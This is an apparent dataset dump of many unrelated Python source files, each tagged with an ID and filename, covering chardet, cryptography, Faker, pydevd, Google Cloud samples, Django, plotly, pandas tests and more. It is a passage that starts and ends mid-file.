# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self) -> None:
        super().__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self) -> str:
        return ""CP949""

    @property
    def language(self) -> str:
        return ""Korean"""
JD131	JD131-types.py	"# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.

import typing

from cryptography.hazmat.primitives.asymmetric import (
    dh,
    dsa,
    ec,
    ed448,
    ed25519,
    rsa,
    x448,
    x25519,
)

# Every asymmetric key type
PUBLIC_KEY_TYPES = typing.Union[
    dh.DHPublicKey,
    dsa.DSAPublicKey,
    rsa.RSAPublicKey,
    ec.EllipticCurvePublicKey,
    ed25519.Ed25519PublicKey,
    ed448.Ed448PublicKey,
    x25519.X25519PublicKey,
    x448.X448PublicKey,
]
# Every asymmetric key type
PRIVATE_KEY_TYPES = typing.Union[
    dh.DHPrivateKey,
    ed25519.Ed25519PrivateKey,
    ed448.Ed448PrivateKey,
    rsa.RSAPrivateKey,
    dsa.DSAPrivateKey,
    ec.EllipticCurvePrivateKey,
    x25519.X25519PrivateKey,
    x448.X448PrivateKey,
]
# Just the key types we allow to be used for x509 signing. This mirrors
# the certificate public key types
CERTIFICATE_PRIVATE_KEY_TYPES = typing.Union[
    ed25519.Ed25519PrivateKey,
    ed448.Ed448PrivateKey,
    rsa.RSAPrivateKey,
    dsa.DSAPrivateKey,
    ec.EllipticCurvePrivateKey,
]
# Just the key types we allow to be used for x509 signing. This mirrors
# the certificate private key types
CERTIFICATE_ISSUER_PUBLIC_KEY_TYPES = typing.Union[
    dsa.DSAPublicKey,
    rsa.RSAPublicKey,
    ec.EllipticCurvePublicKey,
    ed25519.Ed25519PublicKey,
    ed448.Ed448PublicKey,
]
# This type removes DHPublicKey. x448/x25519 can be a public key
# but cannot be used in signing so they are allowed here.
CERTIFICATE_PUBLIC_KEY_TYPES = typing.Union[
    dsa.DSAPublicKey,
    rsa.RSAPublicKey,
    ec.EllipticCurvePublicKey,
    ed25519.Ed25519PublicKey,
    ed448.Ed448PublicKey,
    x25519.X25519PublicKey,
    x448.X448PublicKey,
]"
JD89	JD89-pynamesdef.py	"import contextlib

import rope.base.oi.soi
import rope.base.pyobjects
from rope.base import pynames, utils


class DefinedName(pynames.DefinedName):
    pass


class AssignedName(pynames.AssignedName):
    def __init__(self, lineno=None, module=None, pyobject=None):
        self.lineno = lineno
        self.module = module
        self.assignments = []
        self.pyobject = _Inferred(
            self._get_inferred, pynames._get_concluded_data(module)
        )
        self.pyobject.set(pyobject)

    @utils.prevent_recursion(lambda: None)
    def _get_inferred(self):
        if self.module is not None:
            return rope.base.oi.soi.infer_assigned_object(self)

    def get_object(self):
        return self.pyobject.get()

    def get_definition_location(self):
        """"""Returns a (module, lineno) tuple""""""
        if self.lineno is None and self.assignments:
            with contextlib.suppress(AttributeError):
                self.lineno = self.assignments[0].get_lineno()
        return (self.module, self.lineno)

    def invalidate(self):
        """"""Forget the `PyObject` this `PyName` holds""""""
        self.pyobject.set(None)


class UnboundName(pynames.UnboundName):
    pass


class ParameterName(pynames.ParameterName):
    def __init__(self, pyfunction, index):
        self.pyfunction = pyfunction
        self.index = index

    def get_object(self):
        result = self.pyfunction.get_parameter(self.index)
        if result is None:
            result = rope.base.pyobjects.get_unknown()
        return result

    def get_objects(self):
        """"""Returns the list of objects passed as this parameter""""""
        return rope.base.oi.soi.get_passed_objects(self.pyfunction, self.index)

    def get_definition_location(self):
        return (self.pyfunction.get_module(), self.pyfunction.get_ast().lineno)


class AssignmentValue(pynames.AssignmentValue):
    pass


class EvaluatedName(pynames.EvaluatedName):
    pass


class ImportedModule(pynames.ImportedModule):
    pass


class ImportedName(pynames.ImportedName):
    pass


_Inferred = pynames._Inferred"
JD458	JD458-__init__.py	"import operator

from collections import OrderedDict

from .. import Provider as BaseProvider


def nit_check_digit(nit: str) -> str:
    """"""
    Calculate the check digit of a NIT.

    The check digit is calculated by multiplying the reversed digits of a NIT
    by (3, 7, 13, 17, 19, 23, 29, 37, 41, 43, 47, 53, 59, 67, 71), respectively,
    adding the results and applying MOD 11. If the result is greater than or equal
    to 2, the check digit is 11 minus the result. Otherwise, the check digit is the
    result.
    """"""
    reversed_nit = nit[::-1]
    digits = (int(digit) for digit in reversed_nit)
    multipliers = (3, 7, 13, 17, 19, 23, 29, 37, 41, 43, 47, 53, 59, 67, 71)
    value = sum(map(operator.mul, digits, multipliers)) % 11
    if value >= 2:
        value = 11 - value
    return str(value)


class Provider(BaseProvider):
    nuip_formats = OrderedDict(
        [
            (""10########"", 0.25),
            (""11########"", 0.25),
            (""12########"", 0.1),
            (""%!######"", 0.4),
        ]
    )

    legal_person_nit_formats = [
        ""8########"",
        ""9########"",
    ]

    def nuip(self) -> str:
        """"""
        https://es.wikipedia.org/wiki/C%C3%A9dula_de_Ciudadan%C3%ADa_(Colombia)
        :example: '1095312769'
        """"""
        return self.numerify(self.random_element(self.nuip_formats))

    natural_person_nit = nuip

    def natural_person_nit_with_check_digit(self) -> str:
        """"""
        :example: '1095312769-0'
        """"""
        nit = self.natural_person_nit()
        check_digit = nit_check_digit(nit)
        return f""{nit}-{check_digit}""

    def legal_person_nit(self) -> str:
        """"""
        https://es.wikipedia.org/wiki/N%C3%BAmero_de_Identificaci%C3%B3n_Tributaria
        :example: '967807269'
        """"""
        return self.numerify(self.random_element(self.legal_person_nit_formats))

    def legal_person_nit_with_check_digit(self) -> str:
        """"""
        :example: '967807269-7'
        """"""
        nit = self.legal_person_nit()
        check_digit = nit_check_digit(nit)
        return f""{nit}-{check_digit}"""
JD26	JD26-pydev_localhost.py	"from _pydev_bundle._pydev_saved_modules import socket
import sys

IS_JYTHON = sys.platform.find('java') != -1

_cache = None


def get_localhost():
    '''
    Should return 127.0.0.1 in ipv4 and ::1 in ipv6

    localhost is not used because on windows vista/windows 7, there can be issues where the resolving doesn't work
    properly and takes a lot of time (had this issue on the pyunit server).

    Using the IP directly solves the problem.
    '''
    # TODO: Needs better investigation!

    global _cache
    if _cache is None:
        try:
            for addr_info in socket.getaddrinfo(""localhost"", 80, 0, 0, socket.SOL_TCP):
                config = addr_info[4]
                if config[0] == '127.0.0.1':
                    _cache = '127.0.0.1'
                    return _cache
        except:
            # Ok, some versions of Python don't have getaddrinfo or SOL_TCP... Just consider it 127.0.0.1 in this case.
            _cache = '127.0.0.1'
        else:
            _cache = 'localhost'

    return _cache


def get_socket_names(n_sockets, close=False):
    socket_names = []
    sockets = []
    for _ in range(n_sockets):
        if IS_JYTHON:
            # Although the option which would be pure java *should* work for Jython, the socket being returned is still 0
            # (i.e.: it doesn't give the local port bound, only the original port, which was 0).
            from java.net import ServerSocket
            sock = ServerSocket(0)
            socket_name = get_localhost(), sock.getLocalPort()
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((get_localhost(), 0))
            socket_name = sock.getsockname()

        sockets.append(sock)
        socket_names.append(socket_name)

    if close:
        for s in sockets:
            s.close()
    return socket_names


def get_socket_name(close=False):
    return get_socket_names(1, close)[0]


if __name__ == '__main__':
    print(get_socket_name())"
JY318	JY318-version.py	"__all__ = ['Version']


import typing as t

from ..function import deprecated_classmethod

if t.TYPE_CHECKING:
    import typing_extensions as te


class Version(t.NamedTuple):
    '''Version named tuple

    Example:
        >>> version = Version.fromString('1.2.x')
        >>> version.major, version.minor, version.other, version.micro
        (1, 2, 'x', None)
        >>> version.to_string()
        '1.2.x'
    '''

    major: int
    minor: int
    other: t.Optional[str]

    def __lt__(self, other: 'te.Self') -> bool:
        return (self.major, self.minor) < (other.major, other.minor)

    def __gt__(self, other: 'te.Self') -> bool:
        return other.__lt__(self)

    def __repr__(self) -> str:
        return f'Version.fromString({self.to_string()!r})'

    def __str__(self) -> str:
        return self.to_string()

    @classmethod
    def fromString(cls, version: str) -> 'te.Self':
        parts = version.split('.', maxsplit=2)
        if len(parts) == 2:
            major, minor = parts
            other = None
        elif len(parts) == 3:
            major, minor, other = parts
        else:
            raise Exception(f'""{version}"" is not a valid version string')
        return cls(int(major), int(minor), other)

    @property
    def micro(self) -> t.Optional[int]:
        if self.other is not None:
            parts = self.other.split('.')
            if parts and parts[0].isdigit():
                return int(parts[0])
        return None

    @property
    def micro_int(self) -> int:
        return self.micro or 0

    def to_string(self) -> str:
        version = f'{self.major}.{self.minor}'
        if self.other is not None:
            version += f'.{self.other}'
        return version

    from_string = deprecated_classmethod(fromString)"
JD448	JD448-main_test.py	"# Copyright 2015 Google Inc. All rights reserved.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import mock
import pytest
import webtest

import main


@pytest.fixture
def app(testbed):
    return webtest.TestApp(main.app)


def test_get(app):
    main.Greeting(
        parent=main.guestbook_key('default_guestbook'),
        author='123',
        content='abc'
    ).put()

    response = app.get('/')

    # Let's check if the response is correct.
    assert response.status_int == 200


def test_post(app):
    with mock.patch('main.images') as mock_images:
        mock_images.resize.return_value = 'asdf'

        response = app.post('/sign', {'content': 'asdf'})
        mock_images.resize.assert_called_once_with(mock.ANY, 32, 32)

        # Correct response is a redirect
        assert response.status_int == 302


def test_img(app):
    greeting = main.Greeting(
        parent=main.guestbook_key('default_guestbook'),
        id=123
    )
    greeting.author = 'asdf'
    greeting.content = 'asdf'
    greeting.avatar = b'123'
    greeting.put()

    response = app.get('/img?img_id=%s' % greeting.key.urlsafe())

    assert response.status_int == 200


def test_img_missing(app):
    # Bogus image id, should get error
    app.get('/img?img_id=123', status=500)


def test_post_and_get(app):
    with mock.patch('main.images') as mock_images:
        mock_images.resize.return_value = 'asdf'

        app.post('/sign', {'content': 'asdf'})
        response = app.get('/')

        assert response.status_int == 200"
JD428	JD428-uploader.py	"import sys
import time

import log4p
import pcloud

log = log4p.GetLogger(__name__, config=""log4p.json"").logger


class Uploader:

    def __init__(self, username, password):
        self.pc = pcloud.PyCloud(username, password)
        self.path = '/'

    def is_logged_in(self):
        return len(self.pc.auth_token) > 1

    def set_path(self, path):
        self.pc.createfolderifnotexists(path=path)
        self.path = path

    def upload(self, file):
        response = self.pc.uploadfile(files=[file], path=self.path)
        log.debug(response)
        if response['result'] == 0:
            log.info('Uploaded the file  %s file to pcloud %s', file, self.path)
            time.sleep(1)
            return
        log.error(""Was not able to upload to pcloud"")
        sys.exit(response['result'])

    def get_checksum(self, file):
        response = self.pc.checksumfile(path=self.path+'/'+file)
        log.debug(response)
        return response['sha1']

    def is_file_present(self, file):
        response = self.pc.listfolder(path=self.path)
        log.debug(response)
        dir_content = response['metadata']['contents']
        for item in dir_content:
            if item['name'] == file:
                log.info(""File %s is present in directory %s"", file, self.path)
                return True
        log.info(""File %s not found in directory %s"", file, self.path)
        return False

    def rename_file(self, file, new_name):
        response = self.pc.renamefile(
            path=self.path+'/'+file,
            topath=self.path+'/'+new_name
        )
        log.debug(response)
        if response['result'] == 0:
            log.info(""File %s renamed to %s"", file, new_name)
            time.sleep(1)
            return
        log.error(""Failed to rename file %s to %s"", file, new_name)

    def delete_file(self, file):
        response = self.pc.deletefile(path=self.path+'/'+file)
        log.debug(response)
        if response['result'] == 0:
            log.info(""File %s deleted"", file)
            return
"
JD450	JD450-video_classification_create_dataset.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


# [START automl_video_classification_create_dataset_beta]
from google.cloud import automl_v1beta1 as automl


def create_dataset(
    project_id=""YOUR_PROJECT_ID"", display_name=""your_datasets_display_name""
):
    """"""Create a automl video classification dataset.""""""

    client = automl.AutoMlClient()

    # A resource that represents Google Cloud Platform location.
    project_location = f""projects/{project_id}/locations/us-central1""
    metadata = automl.VideoClassificationDatasetMetadata()
    dataset = automl.Dataset(
        display_name=display_name,
        video_classification_dataset_metadata=metadata,
    )

    # Create a dataset with the dataset metadata in the region.
    created_dataset = client.create_dataset(parent=project_location, dataset=dataset)

    # Display the dataset information
    print(""Dataset name: {}"".format(created_dataset.name))

    # To get the dataset id, you have to parse it out of the `name` field.
    # As dataset Ids are required for other methods.
    # Name Form:
    #    `projects/{project_id}/locations/{location_id}/datasets/{dataset_id}`
    print(""Dataset id: {}"".format(created_dataset.name.split(""/"")[-1]))
# [END automl_video_classification_create_dataset_beta]"
JY540	JY540-client.py	"import os
import signal
import subprocess

from django.db.backends.base.client import BaseDatabaseClient


class DatabaseClient(BaseDatabaseClient):
    executable_name = 'psql'

    @classmethod
    def runshell_db(cls, conn_params, parameters):
        args = [cls.executable_name]

        host = conn_params.get('host', '')
        port = conn_params.get('port', '')
        dbname = conn_params.get('database', '')
        user = conn_params.get('user', '')
        passwd = conn_params.get('password', '')
        sslmode = conn_params.get('sslmode', '')
        sslrootcert = conn_params.get('sslrootcert', '')
        sslcert = conn_params.get('sslcert', '')
        sslkey = conn_params.get('sslkey', '')

        if user:
            args += ['-U', user]
        if host:
            args += ['-h', host]
        if port:
            args += ['-p', str(port)]
        args += [dbname]
        args.extend(parameters)

        sigint_handler = signal.getsignal(signal.SIGINT)
        subprocess_env = os.environ.copy()
        if passwd:
            subprocess_env['PGPASSWORD'] = str(passwd)
        if sslmode:
            subprocess_env['PGSSLMODE'] = str(sslmode)
        if sslrootcert:
            subprocess_env['PGSSLROOTCERT'] = str(sslrootcert)
        if sslcert:
            subprocess_env['PGSSLCERT'] = str(sslcert)
        if sslkey:
            subprocess_env['PGSSLKEY'] = str(sslkey)
        try:
            # Allow SIGINT to pass to psql to abort queries.
            signal.signal(signal.SIGINT, signal.SIG_IGN)
            subprocess.run(args, check=True, env=subprocess_env)
        finally:
            # Restore the original SIGINT handler.
            signal.signal(signal.SIGINT, sigint_handler)

    def runshell(self, parameters):
        self.runshell_db(self.connection.get_connection_params(), parameters)"
JY404	JY404-_font.py	"import _plotly_utils.basevalidators


class FontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""font"", parent_name=""densitymapbox.hoverlabel"", **kwargs
    ):
        super(FontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Font""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY387	JY387-defaults.py	"from __future__ import unicode_literals
from prompt_toolkit.application.current import get_app
from prompt_toolkit.eventloop.context import TaskLocal, TaskLocalNotSetError
from prompt_toolkit.utils import is_windows
from .base import Input
import sys

__all__ = [
    'create_input',
    'create_pipe_input',
    'get_default_input',
    'set_default_input',
]


def create_input(stdin=None):
    stdin = stdin or sys.stdin

    if is_windows():
        from .win32 import Win32Input
        return Win32Input(stdin)
    else:
        from .vt100 import Vt100Input
        return Vt100Input(stdin)


def create_pipe_input():
    """"""
    Create an input pipe.
    This is mostly useful for unit testing.
    """"""
    if is_windows():
        from .win32_pipe import Win32PipeInput
        return Win32PipeInput()
    else:
        from .posix_pipe import PosixPipeInput
        return PosixPipeInput()


_default_input = TaskLocal()


def get_default_input():
    """"""
    Get the input class to be used by default.

    Called when creating a new Application(), when no `Input` has been passed.
    """"""
    # Other create/return the default input.
    try:
        value = _default_input.get()
    except TaskLocalNotSetError:
        # If an application is already running, take the input from there.
        # (This is important for the ""ENTER for continue"" prompts after
        # executing system commands and displaying readline-style completions.)
        app = get_app(return_none=True)
        if app:
            return app.input

        return create_input()
    else:
        return value


def set_default_input(input):
    """"""
    Set the default `Input` class.

    (Used for instance, for the telnet submodule.)
    """"""
    assert isinstance(input, Input)
    _default_input.set(input)"
JD332	JD332-transcribe_streaming_voice_activity_events_test.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import re
from uuid import uuid4

from google.cloud.speech_v2 import SpeechClient
from google.cloud.speech_v2.types import cloud_speech

import transcribe_streaming_voice_activity_events

RESOURCES = os.path.join(os.path.dirname(__file__), ""resources"")


def delete_recognizer(name):
    client = SpeechClient()
    request = cloud_speech.DeleteRecognizerRequest(name=name)
    client.delete_recognizer(request=request)


def test_transcribe_streaming_voice_activity_events(capsys):
    project_id = os.getenv(""GOOGLE_CLOUD_PROJECT"")

    recognizer_id = ""recognizer-"" + str(uuid4())
    responses = transcribe_streaming_voice_activity_events.transcribe_streaming_voice_activity_events(
        project_id, recognizer_id, os.path.join(RESOURCES, ""audio.wav"")
    )

    transcript = """"
    for response in responses:
        for result in response.results:
            transcript += result.alternatives[0].transcript

    assert (
        responses[0].speech_event_type
        == cloud_speech.StreamingRecognizeResponse.SpeechEventType.SPEECH_ACTIVITY_BEGIN
    )

    assert re.search(
        r""how old is the Brooklyn Bridge"",
        transcript,
        re.DOTALL | re.I,
    )

    delete_recognizer(
        f""projects/{project_id}/locations/global/recognizers/{recognizer_id}""
    )"
JY335	JY335-coldobservable.py	"from rx.core import ObservableBase, Observer, AnonymousObserver, Disposable
from rx.disposables import CompositeDisposable

from .subscription import Subscription
from .reactive_assert import AssertList


class ColdObservable(ObservableBase):
    def __init__(self, scheduler, messages):
        super(ColdObservable, self).__init__()

        self.scheduler = scheduler
        self.messages = messages
        self.subscriptions = AssertList()

    def subscribe(self, on_next=None, on_error=None, on_completed=None, observer=None):
        # Be forgiving and accept an un-named observer as first parameter
        if isinstance(on_next, Observer):
            observer = on_next
        elif not observer:
            observer = AnonymousObserver(on_next, on_error, on_completed)

        return self._subscribe_core(observer)

    def _subscribe_core(self, observer):
        clock = self.scheduler.to_relative(self.scheduler.now)
        self.subscriptions.append(Subscription(clock))
        index = len(self.subscriptions) - 1
        disposable = CompositeDisposable()

        def get_action(notification):
            def action(scheduler, state):
                notification.accept(observer)
                return Disposable.empty()
            return action

        for message in self.messages:
            notification = message.value

            # Don't make closures within a loop
            action = get_action(notification)
            disposable.add(self.scheduler.schedule_relative(message.time, action))

        def dispose():
            start = self.subscriptions[index].subscribe
            end = self.scheduler.to_relative(self.scheduler.now)
            self.subscriptions[index] = Subscription(start, end)
            disposable.dispose()

        return Disposable.create(dispose)"
JD142	JD142-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""streamtube"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JD70	JD70-_compat.py	"import sys
import platform


__all__ = ['install', 'NullFinder', 'Protocol']


try:
    from typing import Protocol
except ImportError:  # pragma: no cover
    from ..typing_extensions import Protocol  # type: ignore


def install(cls):
    """"""
    Class decorator for installation on sys.meta_path.

    Adds the backport DistributionFinder to sys.meta_path and
    attempts to disable the finder functionality of the stdlib
    DistributionFinder.
    """"""
    sys.meta_path.append(cls())
    disable_stdlib_finder()
    return cls


def disable_stdlib_finder():
    """"""
    Give the backport primacy for discovering path-based distributions
    by monkey-patching the stdlib O_O.

    See #91 for more background for rationale on this sketchy
    behavior.
    """"""

    def matches(finder):
        return getattr(
            finder, '__module__', None
        ) == '_frozen_importlib_external' and hasattr(finder, 'find_distributions')

    for finder in filter(matches, sys.meta_path):  # pragma: nocover
        del finder.find_distributions


class NullFinder:
    """"""
    A ""Finder"" (aka ""MetaClassFinder"") that never finds any modules,
    but may find distributions.
    """"""

    @staticmethod
    def find_spec(*args, **kwargs):
        return None

    # In Python 2, the import system requires finders
    # to have a find_module() method, but this usage
    # is deprecated in Python 3 in favor of find_spec().
    # For the purposes of this finder (i.e. being present
    # on sys.meta_path but having no other import
    # system functionality), the two methods are identical.
    find_module = find_spec


def pypy_partial(val):
    """"""
    Adjust for variable stacklevel on partial under PyPy.

    Workaround for #327.
    """"""
    is_pypy = platform.python_implementation() == 'PyPy'
    return val + is_pypy"
JY533	JY533-test_deprecate_kwarg.py	"import pytest

from pandas.util._decorators import deprecate_kwarg

import pandas._testing as tm


@deprecate_kwarg(""old"", ""new"")
def _f1(new=False):
    return new


_f2_mappings = {""yes"": True, ""no"": False}


@deprecate_kwarg(""old"", ""new"", _f2_mappings)
def _f2(new=False):
    return new


def _f3_mapping(x):
    return x + 1


@deprecate_kwarg(""old"", ""new"", _f3_mapping)
def _f3(new=0):
    return new


@pytest.mark.parametrize(""key,klass"", [(""old"", FutureWarning), (""new"", None)])
def test_deprecate_kwarg(key, klass):
    x = 78

    with tm.assert_produces_warning(klass):
        assert _f1(**{key: x}) == x


@pytest.mark.parametrize(""key"", list(_f2_mappings.keys()))
def test_dict_deprecate_kwarg(key):
    with tm.assert_produces_warning(FutureWarning):
        assert _f2(old=key) == _f2_mappings[key]


@pytest.mark.parametrize(""key"", [""bogus"", 12345, -1.23])
def test_missing_deprecate_kwarg(key):
    with tm.assert_produces_warning(FutureWarning):
        assert _f2(old=key) == key


@pytest.mark.parametrize(""x"", [1, -1.4, 0])
def test_callable_deprecate_kwarg(x):
    with tm.assert_produces_warning(FutureWarning):
        assert _f3(old=x) == _f3_mapping(x)


def test_callable_deprecate_kwarg_fail():
    msg = ""((can only|cannot) concatenate)|(must be str)|(Can't convert)""

    with pytest.raises(TypeError, match=msg):
        _f3(old=""hello"")


def test_bad_deprecate_kwarg():
    msg = ""mapping from old to new argument values must be dict or callable!""

    with pytest.raises(TypeError, match=msg):

        @deprecate_kwarg(""old"", ""new"", 0)
        def f4(new=None):
            return new


@deprecate_kwarg(""old"", None)
def _f4(old=True, unchanged=True):
    return old, unchanged


@pytest.mark.parametrize(""key"", [""old"", ""unchanged""])
def test_deprecate_keyword(key):
    x = 9

    if key == ""old"":
        klass = FutureWarning
        expected = (x, True)
    else:
        klass = None
        expected = (True, x)

    with tm.assert_produces_warning(klass):
        assert _f4(**{key: x}) == expected"
JD364	JD364-search_with_facet_spec.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Call Retail API to search for a products in a catalog with facets.
#
import google.auth
from google.cloud.retail import SearchRequest, SearchServiceClient

project_id = google.auth.default()[1]


# get search service request:
def get_search_request(query: str, facet_key_param: str):
    default_search_placement = (
        ""projects/""
        + project_id
        + ""/locations/global/catalogs/default_catalog/placements/default_search""
    )
    # PUT THE INTERVALS HERE:
    facet_key = SearchRequest.FacetSpec().FacetKey()
    facet_key.key = facet_key_param

    facet_spec = SearchRequest.FacetSpec()
    facet_spec.facet_key = facet_key

    search_request = SearchRequest()
    search_request.placement = default_search_placement  # Placement is used to identify the Serving Config name.
    search_request.query = query
    search_request.visitor_id = ""123456""  # A unique identifier to track visitors
    search_request.facet_specs = [facet_spec]
    search_request.page_size = 10

    print(""---search request---"")
    print(search_request)

    return search_request


# call the Retail Search:
def search():
    # TRY DIFFERENT FACETS HERE:
    facet_key = ""colorFamilies""

    search_request = get_search_request(""Tee"", facet_key)
    search_response = SearchServiceClient().search(search_request)
    print(""---search response---"")
    if not search_response.results:
        print(""The search operation returned no matching results."")
    else:
        print(search_response)
        print(""---facets:---"")
        print(search_response.facets)
    return search_response


search()"
JD323	JD323-translate_v3beta1_batch_translate_document.py	"# Copyright 2021 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START translate_v3beta1_batch_translate_document]

from google.cloud import translate_v3beta1 as translate


def batch_translate_document(
    input_uri: str,
    output_uri: str,
    project_id: str,
    timeout=180,
):

    client = translate.TranslationServiceClient()

    # The ``global`` location is not supported for batch translation
    location = ""us-central1""

    # Google Cloud Storage location for the source input. This can be a single file
    # (for example, ``gs://translation-test/input.docx``) or a wildcard
    # (for example, ``gs://translation-test/*``).
    # Supported file types: https://cloud.google.com/translate/docs/supported-formats
    gcs_source = {""input_uri"": input_uri}

    batch_document_input_configs = {
        ""gcs_source"": gcs_source,
    }
    gcs_destination = {""output_uri_prefix"": output_uri}
    batch_document_output_config = {""gcs_destination"": gcs_destination}
    parent = f""projects/{project_id}/locations/{location}""

    # Supported language codes: https://cloud.google.com/translate/docs/language
    operation = client.batch_translate_document(
        request={
            ""parent"": parent,
            ""source_language_code"": ""en-US"",
            ""target_language_codes"": [""fr-FR""],
            ""input_configs"": [batch_document_input_configs],
            ""output_config"": batch_document_output_config,
        }
    )

    print(""Waiting for operation to complete..."")
    response = operation.result(timeout)

    print(""Total Pages: {}"".format(response.total_pages))


# [END translate_v3beta1_batch_translate_document]"
JY183	JY183-embed.py	"""""""Simple function for embedding an IPython kernel
""""""
# -----------------------------------------------------------------------------
# Imports
# -----------------------------------------------------------------------------

import sys

from IPython.utils.frame import extract_module_locals

from .kernelapp import IPKernelApp

# -----------------------------------------------------------------------------
# Code
# -----------------------------------------------------------------------------


def embed_kernel(module=None, local_ns=None, **kwargs):
    """"""Embed and start an IPython kernel in a given scope.

    Parameters
    ----------
    module : ModuleType, optional
        The module to load into IPython globals (default: caller)
    local_ns : dict, optional
        The namespace to load into IPython user namespace (default: caller)
    **kwargs : various, optional
        Further keyword args are relayed to the IPKernelApp constructor,
        allowing configuration of the Kernel.  Will only have an effect
        on the first embed_kernel call for a given process.

    """"""
    # get the app if it exists, or set it up if it doesn't
    if IPKernelApp.initialized():
        app = IPKernelApp.instance()
    else:
        app = IPKernelApp.instance(**kwargs)
        app.initialize([])
        # Undo unnecessary sys module mangling from init_sys_modules.
        # This would not be necessary if we could prevent it
        # in the first place by using a different InteractiveShell
        # subclass, as in the regular embed case.
        main = app.kernel.shell._orig_sys_modules_main_mod
        if main is not None:
